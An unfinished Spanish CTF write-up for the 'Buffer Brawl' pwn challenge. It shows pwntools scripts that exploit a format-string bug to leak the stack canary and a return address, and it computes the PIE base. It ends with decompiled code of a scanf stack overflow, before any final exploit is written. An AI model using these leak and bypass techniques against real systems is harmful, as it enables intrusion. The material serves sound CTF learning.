# PWN / Buffer Brawl

Nos dan un juego en donde nos enfrentamos al stack y tenemos varias opciones:
```
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
```

Revisamos la seguridad del binario con checksec:
``` bash
checksec --file=buffer_brawl 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

No tiene nada relevante, pero sí encontramos una [vulnerabilidad de cadena formateada](https://owasp.org/www-community/attacks/Format_string_attack) en la funcion slip:
``` 
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
> 4

Try to slip...
Right or left?
%p
0x7ffca7cad6f0
```

Con este script filtramos las primeras 12 direcciones de memoria del stack y formateamos un poco la salida:

``` python
#leakstack.py
from pwn import *

elf = context.binary = ELF('./buffer_brawl')

io = process('./buffer_brawl')
io.sendline(b"4")
io.recvuntil(b"Right or left?\n")
io.sendline(b"%p"*14)
stack = io.recvline(keepends=False)
stack = [ 
         int(s,16) for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
         ]
print(stack)

for i, s in enumerate(stack):
    # i+1 because $ offsets start at 1
    print(f"{i+1}: {p64(s)} {hex(s)}") 
```

```
python3 leakstack.py 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process './buffer_brawl': pid 6996
[140732999497680, 29, 140658260300893, 0, 0, 8080988412483825701, 8080988412483825701, 8080988412483825701, 94602831163429, 94888781943153, 7242369383397573120, 94888781944032, 94888781940551, 36]
1: b'\xd0wq\xf4\xfe\x7f\x00\x00' 0x7ffef47177d0
2: b'\x1d\x00\x00\x00\x00\x00\x00\x00' 0x1d
3: b']\xd4\xa3\x8d\xed\x7f\x00\x00' 0x7fed8da3d45d
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'%p%p%p%p' 0x7025702570257025
7: b'%p%p%p%p' 0x7025702570257025
8: b'%p%p%p%p' 0x7025702570257025
9: b'%p%p\nV\x00\x00' 0x560a70257025
10: b'q\x11$\x04MV\x00\x00' 0x564d04241171
11: b'\x00\xc2\x93\x1d\x95\x10\x82d' 0x648210951d93c200
12: b'\xe0\x14$\x04MV\x00\x00' 0x564d042414e0
13: b'G\x07$\x04MV\x00\x00' 0x564d04240747
14: b'$\x00\x00\x00\x00\x00\x00\x00' 0x24
[*] Stopped process './buffer_brawl' (pid 6996)
```

Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al menú. Podemos comprobar esto en radare2 u otro debbugger

![f1](https://github.com/user-attachments/assets/21c62cc0-ed0b-4073-8b97-935f0c10b5c0)

![return](https://github.com/user-attachments/assets/ef5625c9-3247-4e99-95db-0c8c4d64da63)

La primera imagen es el estado de la pila justo después de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la décimo-tercera dirección filtrada es el retorno

Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un análisis estático al elf

![slipreturn](https://github.com/user-attachments/assets/385fe987-62a0-4462-8ffd-8362b0318bfa)

Entonces, podemos obtener las direcciones que nos interesan con %11$p y %13$p y calcular la direccion base del ejecutable, por ahora el script iría quedando así:

``` python3
from pwn import *
exe = context.binary = ELF("buffer_brawl")
io = process(exe.path)

def stack_leak(p):
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
``` 

El relleno se usa para alinear correctamente la memoria y asegurarse de que la dirección de la GOT esté en la posición adecuada.

`incompleto`
``` C
void stack_smash(void)

{
  long in_FS_OFFSET;
  undefined auStack_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nThe stack got dizzy! Now it\'s your time to win!");
  puts("Enter your move: ");
  __isoc99_scanf(&DAT_0010213d,auStack_28);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```


